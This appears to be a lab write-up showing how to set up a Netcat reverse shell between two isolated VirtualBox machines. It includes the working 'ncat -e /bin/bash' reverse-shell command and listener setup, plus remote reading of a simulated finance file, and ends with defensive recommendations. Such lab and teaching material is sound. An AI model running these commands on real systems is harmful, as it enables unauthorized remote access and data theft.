
# Linux TCP Reverse Shell

## Project Overview

This project demonstrates how a TCP reverse shell can be established between two Linux virtual machines using Netcat. The lab covers virtual network configuration, connectivity testing, listener setup, remote command execution, file navigation, and remote file manipulation.

Kali Linux was configured as the listener machine, while Linux Mint acted as the target. Both virtual machines were connected through a VirtualBox Internal Network and assigned static IP addresses. After verifying connectivity in both directions, a reverse connection was established from Linux Mint to Kali Linux.

The exercise demonstrates how reverse shells can provide remote command execution and access to files on a target system, highlighting the importance of network security controls and monitoring.

## Lab Objectives & Tools

- **Objectives:** Configure an internal network, verify connectivity between two Linux systems, establish a reverse shell using Netcat, verify remote access, navigate directories, and create and modify files remotely.
- **Tools & Environment:** Kali Linux, Linux Mint, Netcat/Ncat, VirtualBox, Linux command-line utilities.

| Machine / Tool | Purpose | IP Address |
|---|---|---|
| Kali Linux | Listener machine | `192.168.56.10` |
| Linux Mint | Target machine | `192.168.56.20` |
| Netcat / Ncat | TCP connection and listener | Port `8888` |
| VirtualBox | Isolated lab environment | Internal Network |

All testing was performed in a controlled virtual lab environment.

---

## Part 1 – Installing Netcat

### 1. Update the Linux Mint System

The Linux Mint package index was updated before installing Netcat.

```bash
sudo apt update
```

> *System Update Output*

<img width="434" height="309" alt="image" src="https://github.com/user-attachments/assets/6c105d67-a3a7-45b3-b9f1-ae0361d9ff78" />

---

### 2. Install and Verify Netcat

The `ncat` package was installed on Linux Mint.

```bash
sudo apt install ncat
```

The installation was verified by checking the installed version.

```bash
ncat --version
```

> *Netcat Installation and Verification*

<img width="438" height="257" alt="image" src="https://github.com/user-attachments/assets/1ab93229-bd4f-4fb9-b780-6c5e81969f3c" />

---

## Part 2 – Configuring the Internal Network

### 3. Configure Static IP Addresses

Both virtual machines were switched to a VirtualBox Internal Network. Static IP addresses were assigned to their respective network interfaces.

On Kali Linux:

```bash
sudo ip addr add 192.168.56.10/24 dev eth0
sudo ip link set eth0 up
```

On Linux Mint:

```bash
sudo ip addr add 192.168.56.20/24 dev enp0s3
sudo ip link set enp0s3 up
```

This configuration placed both machines on the same subnet, allowing them to communicate through the internal network.

---

## Part 3 – Verifying Network Connectivity

### 4. Test Connectivity from Kali to Linux Mint

A ping test was performed from Kali Linux to Linux Mint to verify connectivity over the internal network.

On Kali Linux:

```bash
ping 192.168.56.20
```

Successful replies indicated that Kali Linux could reach Linux Mint at the assigned IP address.

> *Ping from Kali to Linux Mint*

<img width="468" height="125" alt="image" src="https://github.com/user-attachments/assets/39d8b2ab-a58a-4272-be58-cf291c244bd1" />

---

### 5. Test Connectivity from Linux Mint to Kali

A second ping test was performed from Linux Mint to Kali Linux to verify connectivity in the opposite direction.

On Linux Mint:

```bash
ping 192.168.56.10
```

Successful replies indicated that Linux Mint could reach Kali Linux at its assigned IP address.

> *Ping from Linux Mint to Kali*

<img width="468" height="162" alt="image" src="https://github.com/user-attachments/assets/3720737c-6c2e-4856-831d-172fce53467e" />

---

## Part 4 – Creating a Test File

### 6. Create a Directory and Simulated Data File

A directory named `Finance` and a file named `accounts` were created on the Linux Mint desktop to simulate sensitive data.

Commands used:

```bash
cd ~/Desktop
mkdir Finance
cd Finance
nano accounts
```

The file contained the following sample data:

```text
Accounts         | XYZ
-----------------------
1234567890       | $450,000
9876544321       | $920,000
5473948262       | $125,000
```

The values were used for demonstration purposes in the lab.

> *Accounts File in Nano*

<img width="468" height="129" alt="image" src="https://github.com/user-attachments/assets/ae3af1aa-1764-477f-a8e1-65810c021210" />

The file was verified using:

```bash
cat accounts
```

> *File Verification*

<img width="468" height="86" alt="image" src="https://github.com/user-attachments/assets/f4e71012-5e1c-4f12-9851-f5dc1417a511" />

---

## Part 5 – Establishing the Reverse Shell

### 7. Start the Netcat Listener on Kali Linux

Kali Linux was configured to listen for an incoming TCP connection on port `8888`.

```bash
nc -nlvp 8888
```

The listener waited for Linux Mint to initiate a connection.

> *Netcat Listener Running*

<img width="468" height="59" alt="image" src="https://github.com/user-attachments/assets/7eb2434c-7a29-441a-8bde-83350016b52e" />

---

### 8. Initiate the Reverse Connection from Linux Mint

From Linux Mint, the following command was used to initiate a connection to Kali Linux and provide a Bash shell.

```bash
ncat -e /bin/bash 192.168.56.10 8888
```

The command connected to the listener on Kali Linux and provided remote command execution in the controlled lab environment.

> *Reverse Shell Connection Established*

<img width="468" height="67" alt="image" src="https://github.com/user-attachments/assets/6ae07b3d-46cc-4f02-8298-ed071d808b4a" />

**Security note:** A reverse shell can expose command execution and accessible files to the remote listener. This technique should only be tested in authorized, isolated environments.

---

### 9. Resume the Suspended Session

After the session was accidentally suspended using `Ctrl + Z`, it was resumed with the following command:

```bash
fg
```

This returned the suspended foreground job to the terminal.

> *Resumed Reverse Shell Session*

<img width="387" height="82" alt="image" src="https://github.com/user-attachments/assets/40ec3310-b656-46a3-b947-63fabda225ec" />

---

## Part 6 – Verifying Remote Access

### 10. Identify the Remote System

The following command was executed through the established shell:

```bash
uname -a
```

The output displayed system and kernel information from the remote Linux Mint machine.

> *Remote System Information*

<img width="360" height="45" alt="image" src="https://github.com/user-attachments/assets/cd285cce-1ac3-40fb-b434-abad8d69d57f" />

---

### 11. Navigate to the Desktop and Access the Test File

The remote session was used to navigate to the Linux Mint user's desktop and inspect the test directory.

```bash
cd /home/daniel/Desktop
ls -l
cd Finance
cat accounts
```

This demonstrated that the remote shell could list directories and read the simulated data file using the permissions of the connected user.

> *Directory Listing and File Access*

<img width="387" height="82" alt="image" src="https://github.com/user-attachments/assets/81d0f53e-ed8d-4077-bec2-2eafd0734222" />

---

## Part 7 – Remote File Manipulation

### 12. Create a File Remotely

A new file named `file1.txt` was created through the remote shell.

```bash
touch file1.txt
```

### 13. Write Data to the File

Text was written to the new file and displayed to verify the operation.

```bash
echo "How are you?" > file1.txt
cat file1.txt
```

Expected output:

```text
How are you?
```

This confirmed that the remote session could create and write to a file in the current directory, subject to the connected user's permissions.

> *Remote File Creation and Output*

<img width="403" height="122" alt="image" src="https://github.com/user-attachments/assets/5be957ad-1678-4e7d-9601-4bc37a064fd1" />

---

## Part 8 – Results & Analysis

### Lab Findings

| Test | Result |
|---|---|
| Netcat installation | Installed and verified on Linux Mint. |
| Internal network configuration | Static IP addresses assigned to both machines. |
| Kali-to-Mint connectivity | Ping test performed from `192.168.56.10` to `192.168.56.20`. |
| Mint-to-Kali connectivity | Ping test performed from `192.168.56.20` to `192.168.56.10`. |
| Test file creation | `Finance/accounts` created on Linux Mint. |
| Listener configuration | Kali listened on TCP port `8888`. |
| Reverse connection | Linux Mint initiated a connection to Kali. |
| Remote system verification | `uname -a` used to inspect system information. |
| Remote file access | The `Finance/accounts` file was read through the shell. |
| Remote file manipulation | `file1.txt` was created and populated through the shell. |

### Security Analysis

The lab demonstrated how a reverse shell can provide remote command execution after a target initiates a connection to a listener.

The session was used to inspect system information, navigate the filesystem, read a simulated data file, and create and modify another file. These activities illustrate how a reverse shell may be abused after a system is compromised.

Reverse connections can also complicate network defense because outbound connections may be permitted by default. Network connectivity alone does not guarantee that communication is safe or authorized.

### Security Recommendations

- Restrict unnecessary outbound connections through host and network firewalls.
- Monitor unusual outbound TCP connections and unexpected shell processes.
- Apply least-privilege permissions to limit access to sensitive files.
- Use endpoint monitoring to identify suspicious command execution.
- Segment networks and restrict communication between systems where appropriate.
- Investigate unexpected listening services and connections to unusual ports.
- Use fictional data in security labs and protect real credentials and financial information.
- Perform reverse-shell testing only in authorized environments.

---

## Results & Conclusion

This lab demonstrated how Netcat can be used to establish a TCP reverse shell between Linux Mint and Kali Linux in a VirtualBox Internal Network.

After configuring static IP addresses, connectivity was verified in both directions using two ping tests. Kali Linux was then configured as the listener, and Linux Mint initiated the reverse connection. The resulting session was used to inspect system information, navigate directories, read a simulated data file, and create and modify a file remotely.
